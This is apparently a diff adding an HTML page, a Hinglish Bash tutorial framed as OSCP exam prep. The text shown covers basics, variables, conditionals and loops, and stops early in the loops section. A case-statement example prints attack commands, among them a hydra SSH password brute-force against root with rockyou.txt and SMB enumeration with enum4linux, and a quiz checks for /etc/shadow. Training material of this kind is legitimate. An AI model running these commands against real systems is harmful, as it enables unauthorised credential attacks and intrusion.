@@ -1,0 +1,1946 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Bash Complete Guide — Karan's OSCP Arsenal</title>
+<style>
+  :root {
+    --bg: #0a0a0f;
+    --bg2: #10101a;
+    --bg3: #1a1a2e;
+    --card: #12121f;
+    --border: #2a2a4a;
+    --accent: #00ff88;
+    --accent2: #00bfff;
+    --accent3: #ff6b6b;
+    --accent4: #ffd700;
+    --accent5: #bf5fff;
+    --text: #e0e0e0;
+    --text2: #aaa;
+    --code-bg: #0d0d1a;
+    --tag-red: #ff4444;
+    --tag-green: #00cc66;
+    --tag-blue: #4499ff;
+    --tag-yellow: #ffcc00;
+    --tag-purple: #cc88ff;
+    --tag-orange: #ff8844;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    line-height: 1.6;
+    overflow-x: auto;
+  }
+
+  /* HEADER */
+  .hero {
+    background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #0a0a0f 100%);
+    border-bottom: 2px solid var(--accent);
+    padding: 30px 20px 20px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+  .hero::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: radial-gradient(ellipse at 50% 0%, rgba(0,255,136,0.08) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .hero h1 {
+    font-size: clamp(22px, 5vw, 36px);
+    color: var(--accent);
+    text-shadow: 0 0 30px rgba(0,255,136,0.4);
+    letter-spacing: 2px;
+    margin-bottom: 8px;
+  }
+  .hero .sub {
+    color: var(--accent2);
+    font-size: 14px;
+    letter-spacing: 1px;
+  }
+  .hero .badges {
+    margin-top: 12px;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 8px;
+  }
+  .badge {
+    padding: 4px 12px;
+    border-radius: 20px;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+  .badge-green { background: rgba(0,255,136,0.15); color: var(--accent); border: 1px solid rgba(0,255,136,0.3); }
+  .badge-blue { background: rgba(0,191,255,0.15); color: var(--accent2); border: 1px solid rgba(0,191,255,0.3); }
+  .badge-red { background: rgba(255,107,107,0.15); color: var(--accent3); border: 1px solid rgba(255,107,107,0.3); }
+  .badge-yellow { background: rgba(255,215,0,0.15); color: var(--accent4); border: 1px solid rgba(255,215,0,0.3); }
+  .badge-purple { background: rgba(191,95,255,0.15); color: var(--accent5); border: 1px solid rgba(191,95,255,0.3); }
+
+  /* TABS */
+  .tab-container { position: relative; }
+  .tab-nav {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 4px;
+    padding: 12px 12px 0;
+    background: var(--bg2);
+    border-bottom: 2px solid var(--border);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+  .tab-btn {
+    padding: 8px 14px;
+    border: 1px solid var(--border);
+    border-bottom: none;
+    border-radius: 6px 6px 0 0;
+    background: var(--bg3);
+    color: var(--text2);
+    cursor: pointer;
+    font-size: 12px;
+    font-weight: 600;
+    transition: all 0.2s;
+    white-space: nowrap;
+  }
+  .tab-btn:hover { color: var(--accent); border-color: var(--accent); }
+  .tab-btn.active {
+    background: var(--card);
+    color: var(--accent);
+    border-color: var(--accent);
+    box-shadow: 0 0 10px rgba(0,255,136,0.2);
+  }
+  .tab-content { display: none; padding: 20px; }
+  .tab-content.active { display: block; }
+
+  /* SECTIONS */
+  .section {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px;
+    margin-bottom: 20px;
+    position: relative;
+    overflow: visible;
+  }
+  .section::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 3px; height: 100%;
+  }
+  .section.green::before { background: var(--accent); }
+  .section.blue::before { background: var(--accent2); }
+  .section.red::before { background: var(--accent3); }
+  .section.yellow::before { background: var(--accent4); }
+  .section.purple::before { background: var(--accent5); }
+
+  .section-title {
+    font-size: 16px;
+    font-weight: 700;
+    margin-bottom: 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .section-title.green { color: var(--accent); }
+  .section-title.blue { color: var(--accent2); }
+  .section-title.red { color: var(--accent3); }
+  .section-title.yellow { color: var(--accent4); }
+  .section-title.purple { color: var(--accent5); }
+
+  /* LEVEL BADGE */
+  .level-badge {
+    display: inline-block;
+    padding: 2px 10px;
+    border-radius: 4px;
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    margin-bottom: 10px;
+  }
+  .lv1 { background: rgba(0,255,136,0.2); color: var(--accent); }
+  .lv2 { background: rgba(0,191,255,0.2); color: var(--accent2); }
+  .lv3 { background: rgba(255,107,107,0.2); color: var(--accent3); }
+  .lv4 { background: rgba(255,215,0,0.2); color: var(--accent4); }
+  .lv5 { background: rgba(191,95,255,0.2); color: var(--accent5); }
+
+  /* CODE BLOCKS */
+  pre, .cmd {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 14px 16px;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    font-family: 'Courier New', monospace;
+    font-size: 13px;
+    line-height: 1.7;
+    margin: 10px 0;
+    white-space: pre;
+    display: block;
+  }
+  .cmd-inline {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 2px 8px;
+    font-family: 'Courier New', monospace;
+    font-size: 12px;
+    color: var(--accent);
+  }
+
+  /* SYNTAX COLORS */
+  .kw { color: #ff79c6; }       /* keywords */
+  .fn { color: #50fa7b; }       /* functions */
+  .str { color: #f1fa8c; }      /* strings */
+  .num { color: #bd93f9; }      /* numbers */
+  .cmt { color: #6272a4; }      /* comments */
+  .var { color: #8be9fd; }      /* variables */
+  .op { color: #ff6b6b; }       /* operators */
+  .flag { color: #ffd700; }     /* flags */
+  .out { color: #aaa; }         /* output */
+
+  /* TABLES */
+  .tbl {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 10px 0;
+    font-size: 13px;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    display: block;
+  }
+  .tbl th {
+    background: rgba(0,255,136,0.1);
+    color: var(--accent);
+    padding: 8px 12px;
+    text-align: left;
+    border: 1px solid var(--border);
+    font-size: 11px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+  .tbl td {
+    padding: 7px 12px;
+    border: 1px solid var(--border);
+    vertical-align: top;
+  }
+  .tbl tr:nth-child(even) { background: rgba(255,255,255,0.02); }
+  .tbl tr:hover { background: rgba(0,255,136,0.04); }
+
+  /* INFO BOXES */
+  .info-box {
+    border-radius: 8px;
+    padding: 12px 16px;
+    margin: 10px 0;
+    font-size: 13px;
+  }
+  .info-tip { background: rgba(0,255,136,0.08); border-left: 3px solid var(--accent); }
+  .info-warn { background: rgba(255,215,0,0.08); border-left: 3px solid var(--accent4); }
+  .info-danger { background: rgba(255,107,107,0.08); border-left: 3px solid var(--accent3); }
+  .info-box strong { display: block; margin-bottom: 4px; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
+  .info-tip strong { color: var(--accent); }
+  .info-warn strong { color: var(--accent4); }
+  .info-danger strong { color: var(--accent3); }
+
+  /* COLLAPSIBLE QUIZ */
+  .quiz-box {
+    background: rgba(191,95,255,0.06);
+    border: 1px solid rgba(191,95,255,0.3);
+    border-radius: 8px;
+    margin: 14px 0;
+  }
+  .quiz-header {
+    padding: 10px 16px;
+    cursor: pointer;
+    color: var(--accent5);
+    font-weight: 700;
+    font-size: 13px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    user-select: none;
+  }
+  .quiz-body {
+    display: none;
+    padding: 12px 16px;
+    border-top: 1px solid rgba(191,95,255,0.2);
+    font-size: 13px;
+  }
+  .quiz-body.open { display: block; }
+  .quiz-answer { color: var(--accent); font-family: 'Courier New', monospace; margin-top: 8px; }
+
+  /* STORY BOX */
+  .story {
+    background: linear-gradient(135deg, rgba(0,191,255,0.05), rgba(0,255,136,0.05));
+    border: 1px solid rgba(0,191,255,0.25);
+    border-radius: 10px;
+    padding: 14px 18px;
+    margin: 14px 0;
+    font-size: 13px;
+    font-style: italic;
+    color: var(--text2);
+  }
+  .story strong { color: var(--accent2); font-style: normal; }
+
+  p { margin: 8px 0; font-size: 14px; color: var(--text2); }
+  h3 { color: var(--accent2); font-size: 14px; margin: 14px 0 8px; }
+  h4 { color: var(--accent4); font-size: 13px; margin: 10px 0 6px; }
+  ul, ol { padding-left: 20px; font-size: 13px; color: var(--text2); }
+  li { margin: 4px 0; }
+
+  .progress-bar {
+    height: 4px;
+    background: var(--border);
+    border-radius: 2px;
+    margin: 6px 0 14px;
+    overflow: hidden;
+  }
+  .progress-fill {
+    height: 100%;
+    border-radius: 2px;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+  }
+
+  .two-col {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 14px;
+    margin: 10px 0;
+  }
+  @media(max-width: 600px) {
+    .two-col { grid-template-columns: 1fr; }
+    .tab-btn { font-size: 11px; padding: 6px 10px; }
+  }
+
+  .hack-script {
+    background: #030310;
+    border: 1px solid var(--accent);
+    border-radius: 8px;
+    padding: 16px;
+    margin: 12px 0;
+    position: relative;
+    box-shadow: 0 0 15px rgba(0,255,136,0.1);
+  }
+  .hack-script-label {
+    position: absolute;
+    top: -10px;
+    left: 12px;
+    background: var(--accent);
+    color: #000;
+    font-size: 10px;
+    font-weight: 700;
+    padding: 2px 8px;
+    border-radius: 4px;
+    letter-spacing: 1px;
+  }
+
+  footer {
+    text-align: center;
+    padding: 20px;
+    color: var(--text2);
+    font-size: 12px;
+    border-top: 1px solid var(--border);
+    margin-top: 20px;
+  }
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <h1>⚡ BASH COMPLETE GUIDE ⚡</h1>
+  <div class="sub">KARAN's OSCP BASH ARSENAL — ZERO TO HACKER</div>
+  <div class="badges">
+    <span class="badge badge-green">📟 Shell Scripting</span>
+    <span class="badge badge-blue">🔁 Automation</span>
+    <span class="badge badge-red">🔴 Hacking Scripts</span>
+    <span class="badge badge-yellow">⚙️ System Control</span>
+    <span class="badge badge-purple">🎯 OSCP Prep</span>
+  </div>
+</div>
+
+<div class="tab-container">
+<div class="tab-nav" id="tabNav">
+  <button class="tab-btn active" onclick="showTab('t1',this)">🟢 Basics</button>
+  <button class="tab-btn" onclick="showTab('t2',this)">📥 Variables</button>
+  <button class="tab-btn" onclick="showTab('t3',this)">🔀 Conditions</button>
+  <button class="tab-btn" onclick="showTab('t4',this)">🔁 Loops</button>
+  <button class="tab-btn" onclick="showTab('t5',this)">🔧 Functions</button>
+  <button class="tab-btn" onclick="showTab('t6',this)">📂 Files/IO</button>
+  <button class="tab-btn" onclick="showTab('t7',this)">🔍 Grep/Sed/Awk</button>
+  <button class="tab-btn" onclick="showTab('t8',this)">⚙️ Process/Cron</button>
+  <button class="tab-btn" onclick="showTab('t9',this)">🌐 Network</button>
+  <button class="tab-btn" onclick="showTab('t10',this)">💀 Hack Scripts</button>
+  <button class="tab-btn" onclick="showTab('t11',this)">🚨 Errors/Debug</button>
+  <button class="tab-btn" onclick="showTab('t12',this)">📋 Cheatsheet</button>
+</div>
+
+<!-- ============================= TAB 1: BASICS ============================= -->
+<div class="tab-content active" id="t1">
+
+  <div class="story">
+    <strong>🎮 STORY MODE:</strong> Tu ek hacker hai. Target mil gaya. Ab tujhe ek script chahiye jo automatically sab kuch karti rahe — ports scan kare, users dhundhe, backdoor bana de. Bash teri weapon hai. Seekh le bhai, OSCP mein yahi kaam aayega.
+  </div>
+
+  <div class="section green">
+    <span class="level-badge lv1">LEVEL 1 — FIRST SCRIPT</span>
+    <div class="section-title green">⚡ Bash Kya Hai?</div>
+    <p>Bash = <strong>Bourne Again SHell</strong>. Linux ka default terminal language. Jo tu terminal mein likhta hai manually, woh sab ek file mein daal ke automate kar sakta hai.</p>
+
+    <div class="two-col">
+      <div>
+        <h3>🐚 Shebang Line</h3>
+        <pre><span class="cmt">#!/bin/bash</span>
+<span class="cmt"># Yeh batata hai ki yeh Bash script hai</span>
+<span class="cmt"># Hamesha pehli line mein likhna</span></pre>
+      </div>
+      <div>
+        <h3>▶️ Script Chalana</h3>
+        <pre><span class="cmt"># Script banao</span>
+nano myscript.sh
+
+<span class="cmt"># Execute permission do</span>
+chmod +x myscript.sh
+
+<span class="cmt"># Chalao</span>
+./myscript.sh
+bash myscript.sh</pre>
+      </div>
+    </div>
+
+    <h3>🖥️ Tera Pehla Script</h3>
+    <pre><span class="kw">#!/bin/bash</span>
+
+<span class="fn">echo</span> <span class="str">"Namaste Karan! Bash shuru ho gayi!"</span>
+<span class="fn">echo</span> <span class="str">"Aaj ka date: "</span>
+<span class="fn">date</span>
+<span class="fn">echo</span> <span class="str">"Current user: $USER"</span>
+<span class="fn">echo</span> <span class="str">"Current directory: $PWD"</span></pre>
+
+    <div class="info-box info-tip">
+      <strong>💡 PRO TIP</strong>
+      <code>echo</code> = print karo screen pe. <code>date</code> = current datetime. <code>$USER</code> = environment variable — inhe seedha use kar sakte ho.
+    </div>
+  </div>
+
+  <div class="section blue">
+    <span class="level-badge lv1">LEVEL 1 — COMMANDS</span>
+    <div class="section-title blue">📟 Essential Bash Commands</div>
+
+    <table class="tbl">
+      <tr>
+        <th>Command</th>
+        <th>Kya karta hai</th>
+        <th>Example</th>
+      </tr>
+      <tr><td><code>echo</code></td><td>Screen pe print karo</td><td><code>echo "hello"</code></td></tr>
+      <tr><td><code>read</code></td><td>User se input lo</td><td><code>read name</code></td></tr>
+      <tr><td><code>pwd</code></td><td>Current directory</td><td><code>pwd</code></td></tr>
+      <tr><td><code>ls</code></td><td>Files list</td><td><code>ls -la</code></td></tr>
+      <tr><td><code>cd</code></td><td>Directory change</td><td><code>cd /etc</code></td></tr>
+      <tr><td><code>cat</code></td><td>File content dekhna</td><td><code>cat file.txt</code></td></tr>
+      <tr><td><code>cp / mv / rm</code></td><td>Copy/Move/Delete</td><td><code>cp a.txt b.txt</code></td></tr>
+      <tr><td><code>mkdir</code></td><td>Directory banao</td><td><code>mkdir output</code></td></tr>
+      <tr><td><code>whoami</code></td><td>Current user</td><td><code>whoami</code></td></tr>
+      <tr><td><code>id</code></td><td>User UID/GID</td><td><code>id</code></td></tr>
+      <tr><td><code>uname -a</code></td><td>System info</td><td><code>uname -a</code></td></tr>
+      <tr><td><code>history</code></td><td>Pehle use kiye commands</td><td><code>history | tail -20</code></td></tr>
+      <tr><td><code>clear</code></td><td>Terminal saaf karo</td><td><code>clear</code></td></tr>
+      <tr><td><code>exit</code></td><td>Script/terminal band karo</td><td><code>exit 0</code></td></tr>
+    </table>
+
+    <h3>🔀 Operators</h3>
+    <pre><span class="cmt"># Arithmetic (Ganit)</span>
+$((5 + 3))    <span class="cmt"># 8</span>
+$((10 - 4))   <span class="cmt"># 6</span>
+$((3 * 4))    <span class="cmt"># 12</span>
+$((10 / 2))   <span class="cmt"># 5</span>
+$((10 % 3))   <span class="cmt"># 1 (remainder)</span>
+
+<span class="cmt"># Example:</span>
+<span class="var">result</span>=$((100 / 4))
+<span class="fn">echo</span> <span class="str">"Result: $result"</span>   <span class="cmt"># Result: 25</span></pre>
+
+    <div class="quiz-box">
+      <div class="quiz-header" onclick="toggleQuiz(this)">
+        🧠 MINI QUIZ — Yeh kya print karega? <span>▼</span>
+      </div>
+      <div class="quiz-body">
+        <pre>x=$((5 * 5))
+echo "Answer: $((x + 1))"</pre>
+        <div class="quiz-answer">✅ Answer: 26 (5×5=25, 25+1=26)</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section yellow">
+    <span class="level-badge lv2">LEVEL 2 — I/O</span>
+    <div class="section-title yellow">📥 Input / Output</div>
+
+    <div class="two-col">
+      <div>
+        <h3>Echo Options</h3>
+        <pre><span class="cmt"># Normal print</span>
+echo "Hello"
+
+<span class="cmt"># New line nahi chahiye</span>
+echo -n "Enter IP: "
+
+<span class="cmt"># Colors! (HACKING ME USEFUL)</span>
+echo -e "\e[32mGREEN TEXT\e[0m"
+echo -e "\e[31mRED TEXT\e[0m"
+echo -e "\e[33mYELLOW TEXT\e[0m"
+echo -e "\e[36mCYAN TEXT\e[0m"</pre>
+      </div>
+      <div>
+        <h3>Read (User Input)</h3>
+        <pre><span class="cmt"># Basic input</span>
+read -p "IP daal: " ip
+echo "Target: $ip"
+
+<span class="cmt"># Password (hidden)</span>
+read -sp "Password: " pass
+echo ""  <span class="cmt"># newline</span>
+
+<span class="cmt"># Timeout</span>
+read -t 10 -p "10 sec hai: " val
+
+<span class="cmt"># Multiple values</span>
+read -p "first last: " fn ln
+echo "$fn $ln"</pre>
+      </div>
+    </div>
+
+    <h3>printf (Better than echo)</h3>
+    <pre><span class="cmt"># Formatted output</span>
+printf <span class="str">"%-20s %s\n"</span> <span class="str">"IP"</span> <span class="str">"STATUS"</span>
+printf <span class="str">"%-20s %s\n"</span> <span class="str">"192.168.1.1"</span> <span class="str">"OPEN"</span>
+
+<span class="cmt">Output:</span>
+<span class="out">IP                   STATUS
+192.168.1.1          OPEN</span></pre>
+  </div>
+
+</div>
+
+<!-- ============================= TAB 2: VARIABLES ============================= -->
+<div class="tab-content" id="t2">
+
+  <div class="section green">
+    <span class="level-badge lv1">LEVEL 1</span>
+    <div class="section-title green">📥 Variables — Sab Kuch Yaad Rakhna</div>
+
+    <div class="story"><strong>🎮 ANALOGY:</strong> Variable = ek dabba. Tujhe kisi ka naam store karna hai? Variable mein rakh. IP address? Variable mein. Password? Variable mein. Script mein ek baar define karo, hazaar baar use karo.</div>
+
+    <div class="two-col">
+      <div>
+        <h3>Variable Define Karna</h3>
+        <pre><span class="cmt"># = ke aas paas SPACE NAHI!</span>
+name="Karan"
+age=18
+target_ip="10.10.10.10"
+is_alive=true
+
+<span class="cmt"># Use karna: $ lagao</span>
+echo "Name: $name"
+echo "Target: $target_ip"
+
+<span class="cmt"># Curly braces (safe)</span>
+echo "Hello ${name}!"</pre>
+      </div>
+      <div>
+        <h3>Special Variables</h3>
+        <pre><span class="cmt"># Script arguments</span>
+$0   <span class="cmt"># Script ka naam</span>
+$1   <span class="cmt"># Pehla argument</span>
+$2   <span class="cmt"># Doosra argument</span>
+$@   <span class="cmt"># Sab arguments</span>
+$#   <span class="cmt"># Arguments ka count</span>
+
+<span class="cmt"># Status</span>
+$?   <span class="cmt"># Last command ka exit code</span>
+$$   <span class="cmt"># Current process ID</span>
+$!   <span class="cmt"># Last background PID</span>
+
+<span class="cmt"># Env variables</span>
+$USER  $HOME  $PATH
+$PWD   $SHELL  $HOSTNAME</pre>
+      </div>
+    </div>
+
+    <h3>🎯 Arguments — OSCP Mein Super Useful</h3>
+    <pre><span class="kw">#!/bin/bash</span>
+<span class="cmt"># Usage: ./script.sh 10.10.10.10 80</span>
+
+<span class="kw">if</span> [ $# <span class="op">-lt</span> 2 ]; <span class="kw">then</span>
+    echo <span class="str">"Usage: $0 &lt;ip&gt; &lt;port&gt;"</span>
+    exit 1
+<span class="kw">fi</span>
+
+ip=<span class="var">$1</span>
+port=<span class="var">$2</span>
+
+echo <span class="str">"[*] Target: $ip:$port"</span></pre>
+  </div>
+
+  <div class="section blue">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title blue">🔤 Strings — Text Manipulation</div>
+
+    <div class="two-col">
+      <div>
+        <h3>String Operations</h3>
+        <pre><span class="var">str</span>=<span class="str">"Hello Karan"</span>
+
+<span class="cmt"># Length</span>
+echo ${#str}         <span class="out"># 11</span>
+
+<span class="cmt"># Uppercase/Lowercase</span>
+echo ${str^^}        <span class="out"># HELLO KARAN</span>
+echo ${str,,}        <span class="out"># hello karan</span>
+
+<span class="cmt"># Substring (start, length)</span>
+echo ${str:6:5}      <span class="out"># Karan</span>
+
+<span class="cmt"># Replace</span>
+echo ${str/Karan/Hacker}  <span class="out"># Hello Hacker</span></pre>
+      </div>
+      <div>
+        <h3>String Checks</h3>
+        <pre><span class="var">str</span>=<span class="str">"admin"</span>
+
+<span class="cmt"># Empty check</span>
+[ -z "$str" ] && echo "empty"
+[ -n "$str" ] && echo "not empty"
+
+<span class="cmt"># Contains</span>
+[[ "$str" == *"adm"* ]] && echo "yes"
+
+<span class="cmt"># Starts with</span>
+[[ "$str" == adm* ]] && echo "starts"
+
+<span class="cmt"># Ends with</span>
+[[ "$str" == *min ]] && echo "ends"</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="section yellow">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title yellow">📦 Arrays</div>
+    <pre><span class="cmt"># Array banao</span>
+<span class="var">ports</span>=(21 22 23 25 80 443 445 3389)
+<span class="var">users</span>=(<span class="str">"admin" "root" "karan" "test"</span>)
+
+<span class="cmt"># Access</span>
+echo ${ports[0]}        <span class="out"># 21</span>
+echo ${users[1]}        <span class="out"># root</span>
+
+<span class="cmt"># All elements</span>
+echo ${ports[@]}        <span class="out"># 21 22 23 25 80 443 445 3389</span>
+
+<span class="cmt"># Length</span>
+echo ${#ports[@]}       <span class="out"># 8</span>
+
+<span class="cmt"># Add element</span>
+ports+=(8080)
+
+<span class="cmt"># Loop through array</span>
+<span class="kw">for</span> port <span class="kw">in</span> ${ports[@]}; <span class="kw">do</span>
+    echo "Checking port: $port"
+<span class="kw">done</span>
+
+<span class="cmt"># Associative Array (Dictionary)</span>
+<span class="kw">declare</span> -A services
+services[21]="FTP"
+services[22]="SSH"
+services[80]="HTTP"
+echo ${services[22]}    <span class="out"># SSH</span></pre>
+
+    <div class="quiz-box">
+      <div class="quiz-header" onclick="toggleQuiz(this)">
+        🧠 MINI QUIZ — Array ka 3rd element kaise nikaalein? <span>▼</span>
+      </div>
+      <div class="quiz-body">
+        <pre>arr=("nmap" "gobuster" "sqlmap" "hydra")
+echo ___________</pre>
+        <div class="quiz-answer">✅ echo ${arr[2]} → sqlmap (index 0 se shuru hota hai!)</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ============================= TAB 3: CONDITIONS ============================= -->
+<div class="tab-content" id="t3">
+
+  <div class="section green">
+    <span class="level-badge lv1">LEVEL 1</span>
+    <div class="section-title green">🔀 if / elif / else — Decision Making</div>
+
+    <pre><span class="kw">#!/bin/bash</span>
+
+<span class="var">port</span>=80
+
+<span class="kw">if</span> [ <span class="var">$port</span> <span class="op">-eq</span> 80 ]; <span class="kw">then</span>
+    echo <span class="str">"HTTP port open!"</span>
+<span class="kw">elif</span> [ <span class="var">$port</span> <span class="op">-eq</span> 443 ]; <span class="kw">then</span>
+    echo <span class="str">"HTTPS port open!"</span>
+<span class="kw">elif</span> [ <span class="var">$port</span> <span class="op">-eq</span> 22 ]; <span class="kw">then</span>
+    echo <span class="str">"SSH port open!"</span>
+<span class="kw">else</span>
+    echo <span class="str">"Unknown service on port $port"</span>
+<span class="kw">fi</span></pre>
+
+    <h3>📊 Comparison Operators</h3>
+    <div class="two-col">
+      <div>
+        <h4>Number Comparison</h4>
+        <table class="tbl">
+          <tr><th>Operator</th><th>Matlab</th></tr>
+          <tr><td><code>-eq</code></td><td>equal (==)</td></tr>
+          <tr><td><code>-ne</code></td><td>not equal (!=)</td></tr>
+          <tr><td><code>-lt</code></td><td>less than (&lt;)</td></tr>
+          <tr><td><code>-le</code></td><td>less or equal (&lt;=)</td></tr>
+          <tr><td><code>-gt</code></td><td>greater than (&gt;)</td></tr>
+          <tr><td><code>-ge</code></td><td>greater or equal (&gt;=)</td></tr>
+        </table>
+      </div>
+      <div>
+        <h4>String Comparison</h4>
+        <table class="tbl">
+          <tr><th>Operator</th><th>Matlab</th></tr>
+          <tr><td><code>=</code> ya <code>==</code></td><td>equal</td></tr>
+          <tr><td><code>!=</code></td><td>not equal</td></tr>
+          <tr><td><code>-z</code></td><td>empty string?</td></tr>
+          <tr><td><code>-n</code></td><td>non-empty?</td></tr>
+          <tr><td><code>&lt;</code></td><td>alphabetically before</td></tr>
+          <tr><td><code>&gt;</code></td><td>alphabetically after</td></tr>
+        </table>
+      </div>
+    </div>
+
+    <h4>File Tests</h4>
+    <table class="tbl">
+      <tr><th>Test</th><th>Matlab</th><th>Example</th></tr>
+      <tr><td><code>-f</code></td><td>File exist karta hai?</td><td><code>[ -f /etc/passwd ]</code></td></tr>
+      <tr><td><code>-d</code></td><td>Directory exist?</td><td><code>[ -d /tmp ]</code></td></tr>
+      <tr><td><code>-e</code></td><td>File/dir exist?</td><td><code>[ -e /etc ]</code></td></tr>
+      <tr><td><code>-r</code></td><td>Readable?</td><td><code>[ -r secret.txt ]</code></td></tr>
+      <tr><td><code>-w</code></td><td>Writable?</td><td><code>[ -w /var/www ]</code></td></tr>
+      <tr><td><code>-x</code></td><td>Executable?</td><td><code>[ -x ./script.sh ]</code></td></tr>
+      <tr><td><code>-s</code></td><td>Size > 0?</td><td><code>[ -s results.txt ]</code></td></tr>
+    </table>
+  </div>
+
+  <div class="section blue">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title blue">🔗 Logical Operators + Advanced</div>
+
+    <div class="two-col">
+      <div>
+        <h3>AND / OR / NOT</h3>
+        <pre><span class="cmt"># AND (&&) — dono true hone chahiye</span>
+<span class="kw">if</span> [[ $port -eq 80 <span class="op">&&</span> $proto == "tcp" ]]; then
+    echo "HTTP TCP"
+fi
+
+<span class="cmt"># OR (||) — ek bhi true ho</span>
+<span class="kw">if</span> [[ $port -eq 80 <span class="op">||</span> $port -eq 443 ]]; then
+    echo "Web service"
+fi
+
+<span class="cmt"># NOT (!)</span>
+<span class="kw">if</span> [[ <span class="op">!</span> -f "output.txt" ]]; then
+    echo "File nahi mila!"
+fi</pre>
+      </div>
+      <div>
+        <h3>Shorthand (Hacker Style)</h3>
+        <pre><span class="cmt"># Command succeed hua? Tab yeh karo</span>
+ping -c1 $ip &>/dev/null && echo "UP"
+
+<span class="cmt"># Command fail hua? Yeh karo</span>
+[ -f file.txt ] || echo "File missing"
+
+<span class="cmt"># One-liner if</span>
+[ $x -gt 5 ] && echo "big" || echo "small"
+
+<span class="cmt"># Exit if args missing</span>
+[ $# -eq 0 ] && { echo "Usage!"; exit 1; }</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="section red">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title red">🔄 Case Statement</div>
+    <pre><span class="kw">#!/bin/bash</span>
+<span class="var">service</span>=<span class="str">"ftp"</span>
+
+<span class="kw">case</span> $service <span class="kw">in</span>
+    "ftp" | "21")
+        echo <span class="str">"[*] FTP found — try anonymous login!"</span>
+        echo <span class="str">"    ftp $ip; user: anonymous"</span>
+        ;;
+    "ssh" | "22")
+        echo <span class="str">"[*] SSH found — try hydra!"</span>
+        echo <span class="str">"    hydra -l root -P rockyou.txt $ip ssh"</span>
+        ;;
+    "http" | "80")
+        echo <span class="str">"[*] HTTP — try gobuster!"</span>
+        echo <span class="str">"    gobuster dir -u http://$ip -w wordlist.txt"</span>
+        ;;
+    "smb" | "445")
+        echo <span class="str">"[*] SMB — enum4linux!"</span>
+        echo <span class="str">"    enum4linux -a $ip"</span>
+        ;;
+    *)
+        echo <span class="str">"[?] Unknown service: $service"</span>
+        ;;
+<span class="kw">esac</span></pre>
+
+    <div class="quiz-box">
+      <div class="quiz-header" onclick="toggleQuiz(this)">
+        🧠 MINI QUIZ — file /etc/shadow exist karta hai ki nahi check karo <span>▼</span>
+      </div>
+      <div class="quiz-body">
+        <div class="quiz-answer">✅ if [ -f /etc/shadow ]; then<br>&nbsp;&nbsp;&nbsp;&nbsp;echo "Shadow file milii!"<br>fi</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ============================= TAB 4: LOOPS ============================= -->
+<div class="tab-content" id="t4">
+
+  <div class="section green">
+    <span class="level-badge lv1">LEVEL 1</span>
+    <div class="section-title green">🔁 for Loop</div>
+    <div class="story"><strong>🎮 ANALOGY:</strong> Loop = tujhe 254 IPs ko ping karna hai. Manually? Never. Loop lagao — ek baar likho, 254 baar chalega.</div>
+
+    <pre><span class="cmt"># Basic for loop</span>
+<span class="kw">for</span> i <span class="kw">in</span> 1 2 3 4 5; <span class="kw">do</span>
+    echo <span class="str">"Number: $i"</span>
+<span class="kw">done</span>
+
+<span class="cmt"># Range (C-style)</span>
+<span class="kw">for</span> ((i=1; i<=10; i++)); <span class="kw">do</span>
+    echo <span class="str">"Count: $i"</span>
+<span class="kw">done</span>
+
+<span class="cmt"># Brace expansion</span>
+<span class="kw">for</span> i <span class="kw">in</span> {1..254}; <span class="kw">do</span>
+    echo <span class="str">"192.168.1.$i"</span>
+<span class="kw">done</span>
+
+<span class="cmt"># Step value</span>
+<span class="kw">for</span> i <span class="kw">in</span> {0..100..10}; <span class="kw">do</span>
+    echo <span class="str">"$i"</span>   <span class="out"># 0 10 20 30 ... 100</span>
+<span class="kw">done</span>
+
+<span class="cmt"># List through items</span>
+<span class="kw">for</span> tool <span class="kw">in</span> nmap gobuster sqlmap hydra; <span class="kw">do</span>
+    echo <span class="str">"Installing: $tool"</span>
+    apt install $tool -y
+<span class="kw">done</span>
+
+<span class="cmt"># Files loop</span>
+<span class="kw">for</span> file <span class="kw">in</span> /etc/*.conf; <span class="kw">do</span>
+    echo <span class="str">"Config: $file"</span>
+<span class="kw">done</span></pre>
+  </div>
+
+  <div class="section blue">
+    <span class="level-badge lv1">LEVEL 1</span>
+    <div class="section-title blue">⏳ while Loop</div>
+    <pre><span class="cmt"># Basic while</span>
+<span class="var">count</span>=1
